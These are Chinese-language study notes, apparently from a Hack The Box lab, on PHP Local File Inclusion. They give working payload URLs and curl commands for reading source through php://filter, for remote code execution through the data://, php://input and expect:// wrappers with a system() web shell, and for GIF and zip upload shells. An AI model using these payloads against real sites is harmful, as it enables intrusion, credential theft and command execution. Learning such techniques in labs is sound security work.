# LFI(Local File Inclusion)

## 利用LFI漏洞读取php执行文件
正常执行服务器的en.php文件:
> http://<SERVER_IP>:<PORT>/index.php?language=en

一般建议还是用linux下的curl -s "http://<SERVER_IP>:<PORT>/index.php?language=en"来获取比较好。

---
不加文件后缀php是因为，服务器会自动追加，
不然就是
> http://<SERVER_IP>:<PORT>/index.php?language=en.php 
---

但若想直接查看该en.php文件的源码,
该文件首先要存在LFI(Local File Inclusion)漏洞，
使用浏览器执行:
> http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=en

则会得到该php文件源码的base64编码的字符串形式。
但要注意，base64编码字符串必须符合base64的padding规则，即字符串必须符合3的倍数，不够的情况下用1道2个“=”补足。
对该base64编码的字符串进行解码即可查看到源码。

## 利用ffuf模块(需安装)扫描
任务之一就是利用
> http://<SERVER_IP>:<PORT>/index.php?language=en

来找到config.php的源文件代码,以此读出登录名、密码等。
但因不知道config文件的具体名称和位置,
因此需要使用ffuf来探测上述接口,具体在本地或服务器上执行:
> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

可以看到config的文件名是configure.
因此,获取configure.php的源代码就和上述‘利用LFI漏洞读取php执行文件’一样了:
> http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=configure

fuff工具用途广泛，可用于多种用途：
* 目录发现，可选择在 URL 中的任何位置进行模糊测试。
* 子域名发现
* 使用各种 HTTP 方法进行模糊测试

(还未安装该模块，以后可以研究一下)

---
## base64加密及解密
使用base64进行编码：
``` Linux
[root@somebody]# echo "a" | base64
YQo=
```
使用base64进行解码：
``` Linux
[root@giantslayer1980 ~]# echo "YQo=" | base64 -d
a
```
依次,编码直接用 base64 ,可以多次编码,解码使用 base64 -d 即可。
---

---
## REC(Remote Code Execution)
有三种 Php Wrapper 可供使用:
Data Wrapper / Input Wrapper / Expect Wrapper

### Data Wrapper
前提是要查找目标的php.ini中是否开放:
allow_url_include = on
(这是因为include()/include_once()可以远程执行Remote URL,而require()/require_once()不可以)

对要执行的php代码进行base64编码,然后传递给data wrapper:
下面是两个例子：
1. 比如要执行的php代码是<?php system($_GET["cmd"]); ?>，
  用base64编码为:
  PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==,
  注意上面的+=之类的url特殊字符需要转义。
  接下来就可以访问网站:
  http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

2. 比如要执行的php代码是<?php system('ls /'); ?>
    为了查看根目录中的文件.
    用base64编码为:
    PD9waHAgc3lzdGVtKCdscyAvJyk7ID8+Cg==
    接下来访问网站:
    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAvJyk7ID8%2BCgMM
    注意:这时不需要&cmd=id之类的传参了。

### Input Wrapper
Input Wrapper 也需要 allow_url_include = on 这一前提条件。
1. 完成Data Wrapper的第一个例子的执行:
    Vito1026@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
    (-s是Silent模式;- X是request COMMAND)

2. 完成Data Wrapper的第二个例子的执行:
   curl -s -X POST --data '<?php system("ls /"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input"

### Expect Wrapper
前提条件：
Expect Wrapper 需要查找目标的php.ini的 extension=expect 是否开启。
Expect Wrapper更为直接，直接执行代码。
1. 完成Data Wrapper的第一个例子的执行:
   Vito1026@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
   没有成功返回需要的数据，不知道为什么。

2. 完成Data Wrapper的第二个例子的执行:
   没想到要具体怎么使用。

---

# RFI(Remote File Inclusion)


# File Upload Attacks 

## 通过上传带有恶意php代码的gif图片,并远程执行
编写带有gif后缀及content(即GIF8开头)的文件:
> vito1026@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
或者
> echo "GIF8<?php system('ls /') ?>" > shell2.gif
> echo "GIF8<?php system('pwd') ?>" > shell3.gif

注意：
GIF的文件是这样的格式,但其他图片的格式就不是这样的，应该会更复杂，需要注意。

上传后,找出该gif的目录及文件名。
最后远程执行该gif文件:
> http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id

## 也是编写gif图片,但是是通过Zip Upload方式：

> echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

这里会生成shell.php 和 shell.jpg 文件,后续仅上传shell.jpg

那么通过LFI漏洞,先解压该shell.jpg文件,并执行解压出来的shell.php文件:
> http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

